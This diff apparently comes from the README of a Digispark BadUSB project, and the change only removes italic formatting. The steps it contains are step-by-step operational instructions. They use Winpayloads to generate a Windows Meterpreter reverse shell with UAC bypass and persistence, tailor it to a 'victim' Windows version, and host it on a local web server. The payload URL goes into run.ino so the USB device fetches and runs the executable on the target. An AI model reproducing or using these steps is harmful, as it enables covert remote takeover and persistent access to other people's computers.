@@ -3,17 +3,17 @@
  ### METHOD 1 On the host machine(Linux): Using Winpayloads 
    ~ https://github.com/nccgroup/Winpayloads/blob/master/README.md ~
    #### Installation: 
-        1. *git clone https://github.com/nccgroup/Winpayloads.git*
-        2. *cd Winpayloads*  
-        3. *./setup.sh*
+        1. git clone https://github.com/nccgroup/Winpayloads.git
+        2. cd Winpayloads  
+        3. ./setup.sh
         
    #### RUN: 
-        1. *./WinPayLoads.py*
-        2. *2* (to run Windows Meterpreter Reverse Shell [uacbypass, persistence, allchecks]  )
+        1. ./WinPayLoads.py
+        2. 2 (to run Windows Meterpreter Reverse Shell [uacbypass, persistence, allchecks]  )
         3. Enter port and ip or simply press Enter for defaults
-        4. *y* (for UAC Bypass)
+        4. y (for UAC Bypass)
         5. enter victim windows version
-        6. *y* to upload to local webserver
+        6. y to upload to local webserver
         7. That's it!! update run.ino with the url to the executable eg: http://192.168.0.24:8000/fgxjdqzp.exe, then compile and load to your digispark
 
   ### On the host machine (linux): // if above method doesn't work. (note: change 192.168.0.24 to your ip, and 8080 to the port you desire)
